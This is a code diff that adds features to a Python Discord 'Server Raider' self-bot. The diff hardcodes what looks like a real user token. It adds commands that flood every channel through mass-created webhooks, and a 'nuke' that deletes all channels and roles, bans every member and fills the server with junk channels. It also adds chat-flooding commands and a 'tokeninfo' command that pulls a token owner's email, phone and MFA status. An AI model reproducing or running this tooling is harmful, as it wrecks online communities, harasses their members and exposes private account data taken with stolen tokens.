@@ -1,10 +1,14 @@
 import json
 import asyncio
 import random
+import string
+import time
+import functools
 import threading
 import sys
 import requests
 import time
+import socket
 import os
 import discord
 import discord.ext
@@ -12,13 +16,21 @@ from discord.ext import commands
 from discord.ext import tasks
 import aiohttp
 import numpy
+import urllib.parse
+import urllib.request
+import itertools
+from itertools import cycle
+import datetime
 import colorama
 from colorama import Fore
+from discord import Webhook, AsyncWebhookAdapter
+from discord.ext.commands import *
+from discord.ext.tasks import *
 
 terminal_title = "Server Raider Self-Bot | Made by Lotus.xml#8697"
 print(f'\33]0;{terminal_title}\a', end='', flush=True)
 prefix = ('.')
-discordtoken = ('tokenhere')
+discordtoken = ('OTQxMDIxNDU3OTY0NzMyNDU2.YgW8tw._wFLDHJ8wuVIb4b0bhQ8JS8X2Ms')
 
 def Init():
     token = discordtoken
@@ -48,6 +60,88 @@ def Clear():
    elif sys.platform == "win32":
     os.system("cls")
 
+def async_executor():
+    def outer(func):
+        @functools.wraps(func)
+        def inner(*args, **kwargs):
+            thing = functools.partial(func, *args, **kwargs)
+            return loop.run_in_executor(None, thing)
+        return inner
+    return outer
+
+def RandomColor(): 
+    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
+    return randcolor
+
+def RandString():
+    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))
+
+languages = {
+    'hu'    : 'Hungarian, Hungary',
+    'nl'    : 'Dutch, Netherlands',
+    'no'    : 'Norwegian, Norway',
+    'pl'    : 'Polish, Poland',
+    'pt-BR' : 'Portuguese, Brazilian, Brazil',
+    'ro'    : 'Romanian, Romania',
+    'fi'    : 'Finnish, Finland',
+    'sv-SE' : 'Swedish, Sweden',
+    'vi'    : 'Vietnamese, Vietnam',
+    'tr'    : 'Turkish, Turkey',
+    'cs'    : 'Czech, Czechia, Czech Republic',
+    'el'    : 'Greek, Greece',
+    'bg'    : 'Bulgarian, Bulgaria',
+    'ru'    : 'Russian, Russia',
+    'uk'    : 'Ukranian, Ukraine',
+    'th'    : 'Thai, Thailand',
+    'zh-CN' : 'Chinese, China',
+    'ja'    : 'Japanese',
+    'zh-TW' : 'Chinese, Taiwan',
+    'ko'    : 'Korean, Korea'
+}
+
+locales = [ 
+    "da", "de",
+    "en-GB", "en-US",
+    "es-ES", "fr",
+    "hr", "it",
+    "lt", "hu",
+    "nl", "no",
+    "pl", "pt-BR",
+    "ro", "fi",
+    "sv-SE", "vi",
+    "tr", "cs",
+    "el", "bg",
+    "ru", "uk",
+    "th", "zh-CN",
+    "ja", "zh-TW",
+    "ko"
+]
+
+m_numbers = [
+    ":one:",
+    ":two:", 
+    ":three:", 
+    ":four:", 
+    ":five:", 
+    ":six:"
+]
+
+m_offets = [
+    (-1, -1),
+    (0, -1),
+    (1, -1),
+    (-1, 0),
+    (1, 0),
+    (-1, 1),
+    (0, 1),
+    (1, 1)
+]
+
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+start_time = datetime.datetime.utcnow()
+loop = asyncio.get_event_loop()
+
 @bot.event
 async def on_connect():
     Clear()
@@ -58,8 +152,7 @@ async def on_connect():
                       {Fore.CYAN}
                     Made by:
                     Lotus.xml#8697
-                      
-                      
+        
                     Logged in as: {bot.user.name}#{bot.user.discriminator}
                     ID: {bot.user.id}
                     Guilds: {len(bot.guilds)}
@@ -157,12 +250,235 @@ async def spam(ctx, amount: int, *, message): # b'\xfc'
         await ctx.send(message)
                         
 @bot.command()
+async def ping(ctx):
+    await ctx.message.delete()
+    before = time.monotonic()
+    message = await ctx.send("Pinging! Please Wait!")
+    ping = (time.monotonic() - before) * 1000
+    await asyncio.sleep(0.1)
+    await message.edit(content=f"⏳ Bot Ping: {int(ping)}ms ⌛")
+    await asyncio.sleep(2.5)
+    await message.edit(content=f"⌛ Bot Ping: {int(ping)}ms ⏳")
+    await asyncio.sleep(2.5)
+    await message.edit(content=f"⏳ Bot Ping: {int(ping)}ms ⌛")
+    await asyncio.sleep(2.5)
+    await message.edit(content=f"⌛ Bot Ping: {int(ping)}ms ⏳")
+    await asyncio.sleep(2.5)
+    await message.edit(content=f"⏳ Bot Ping: {int(ping)}ms ⌛")
+
+def webhookspam(webhook):
+    while spamwebhoook:
+        data = {'content':'@everyone __**lmfao**__ @here'}
+        spamming = requests.post(webhook, json=data, headers={"content-type": "application/json", "User-Agent": get_random_user_agent()})
+        spammingerror = spamming.text
+        if spamming.status_code == 204:
+            continue
+        if 'rate limited' in spammingerror.lower():
+            try:
+                j = json.loads(spammingerror)
+                ratelimit = j['retry_after']
+                timetowait = ratelimit / 1000
+                time.sleep(timetowait)
+
+            except:
+                delay = random.randint(0.5, 1)
+                time.sleep(delay)
+        else:
+            delay = random.randint(1, 15)
+            time.sleep(delay)
+
+
+@bot.command()
+async def stopwebhookraid(ctx):
+    global spamwebhoook
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    spamwebhoook = False
+
+@bot.command()
+async def webhookraid(ctx):
+    global spamwebhoook
+    try:
+        await ctx.message.delete()
+
+    except:
+        pass
+    spamwebhoook = True
+    if len(await ctx.guild.webhooks()) != 0:
+        for webhook in await ctx.guild.webhooks():
+            threading.Thread(target=webhookspam, args=(webhook.url,)).start()
+
+    if len(ctx.guild.text_channels) >= 50:
+        webhookamount = 5 / len(ctx.guild.text_channels)
+        webhookamount = int(webhookamount) + 1
+
+    else:
+        webhookamount = 50 / len(ctx.guild.text_channels)
+        webhookamount = int(webhookamount) + 1
+
+    for _i in range(webhookamount):
+        for channel in ctx.guild.text_channels:
+            try:
+                while True:
+                    webhook = await channel.create_webhook(name='lol')
+                    await asyncio.sleep(0.35)
+                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
+                    webhook = await channel.create_webhook(name='spam')
+                    await asyncio.sleep(0.35)
+                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
+                    webhook = await channel.create_webhook(name='get fucked')
+                    await asyncio.sleep(0.35)
+                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
+                    webhook = await channel.create_webhook(name='rip server')
+                    await asyncio.sleep(0.35)
+                    threading.Thread(target=webhookspam, args=(webhook.url,)).start()
+                f = open(r'webhooks'+str(ctx.guild.id)+".txt",'a')
+                f.write(f"{webhook.url} \n")
+                f.close()
+            except:
+                print (f"{Fore.RED}Webhook Error")
+
+@bot.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    for channel in list(ctx.guild.channels):
+        try:
+            await channel.delete()    
+        except:
+            pass
+    for user in list(ctx.guild.members):
+        try:
+            await user.ban()
+        except:
+            pass    
+    for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+        except:
+            pass
+    try:
+        await ctx.guild.edit(
+            name="lol",
+            description="nuked",
+            reason="lol get fucked",
+            icon="https://media.discordapp.net/attachments/888103552109641748/901600870909763625/bot3.jpg",
+            banner=None
+        )  
+    except:
+        pass        
+    for _i in range(250):
+        await ctx.guild.create_text_channel(name="get fucked")
+    for _i in range(250):
+        await ctx.guild.create_role(name="lmfaoooo", color=RandomColor())
+        
+count = 0
+
+@bot.command()
+async def blankflood(ctx, *, amount: int):
+    await ctx.message.delete()
+    for _i in range(amount):
+        await ctx.send("ﾠﾠ"+"\n" * 400 + "ﾠﾠ")
+
+@bot.command(aliases=["lagchat"])
+async def lag(ctx):
+        await ctx.message.delete()
+        await ctx.send('https://gfycat.com/boilingmarriedcalf')
+        await ctx.send("https://c.tenor.com/l21v9331sCEAAAAC/discord.gif")
+        await ctx.send("https://gfycat.com/boilingmarriedcalf")
+        await ctx.send("https://c.tenor.com/5wcf_RXHcDQAAAAC/car.gif")
+        await ctx.send("https://gfycat.com/boilingmarriedcalf")
+        await ctx.send("https://c.tenor.com/l21v9331sCEAAAAC/discord.gif")
+        await ctx.send("https://gfycat.com/boilingmarriedcalf")
+
+@bot.command()
+async def logout(ctx): 
+    await ctx.message.delete()
+    await asyncio.sleep(0.5)
+    message = await ctx.send('**Logging Out.**')
+    await asyncio.sleep(0.5)
+    await message.edit(content='**Logging Out..**')
+    await asyncio.sleep(0.5)
+    await message.edit(content='**Logging Out...**')
+    await asyncio.sleep(0.5)
+    await message.edit(content='**Logged out!**')
+    await bot.logout()
+
+@bot.command(aliases=['changehypesquad'])
+async def hypesquad(ctx, house): # b'\xfc'
+    await ctx.message.delete()
+    request = requests.Session()
+    headers = {
+      'Authorization': discordtoken,
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
+    }    
+    if house == "bravery":
+      payload = {'house_id': 1}
+    elif house == "brilliance":
+      payload = {'house_id': 2}
+    elif house == "balance":
+      payload = {'house_id': 3}
+    elif house == "random":
+        houses = [1, 2, 3]
+        payload = {'house_id': random.choice(houses)}
+    try:
+        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
+    except Exception as e:
+        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
+
+@bot.command(aliases=['tokinfo', 'tdox'])
+async def tokeninfo(ctx, _token): # b'\xfc'
+    await ctx.message.delete()
+    headers = {
+        'Authorization': _token,
+        'Content-Type': 'application/json'
+    }      
+    try:
+        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+        res = res.json()
+        user_id = res['id']
+        locale = res['locale']
+        avatar_id = res['avatar']
+        language = languages.get(locale)
+        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
+    except KeyError:
+        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
+    em = discord.Embed(
+        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
+    fields = [
+        {'name': 'Phone', 'value': res['phone']},
+        {'name': 'Flags', 'value': res['flags']},
+        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
+        {'name': 'MFA?', 'value': res['mfa_enabled']},
+        {'name': 'Verified?', 'value': res['verified']},
+    ]
+    for field in fields:
+        if field['value']:
+            em.add_field(name=field['name'], value=field['value'], inline=False)
+            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
+    try:
+        return await ctx.send(embed=em)
+    except:
+        return await ctx.send(f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nFlags: `{res['flags']}`\nMFA: `{res['mfa_enabled']}`\nVerified: `{res['verified']}`")
+
+@bot.command()
 async def help(ctx):
     await ctx.message.delete()
-    print('''
-    tokenraid [threads] [amount] [channel id] (message)
-    tokenjoin [delay] [invite code]
-    spam (message)''')
-                        
+    print(f'''
+    {prefix}tokenraid [threads] [amount] [channel id] (message)
+    {prefix}tokenjoin [delay] [invite code]
+    {prefix}spam (message)
+    {prefix}webhookraid    spams a server with webhooks
+    {prefix}stopwebhookraid    stops the raid
+    {prefix}nuke    nukes the server
+    {prefix}ping    checks the bots ping
+    {prefix}lagchat    spam discord crash gifs
+    {prefix}logout    logs the bot out
+    {prefix}hypesquad (hypesquad) changes hypesquad
+    {prefix}tokeninfo (token) displays info on the given token
+    ''')
+
 if __name__ == '__main__':
     Init()
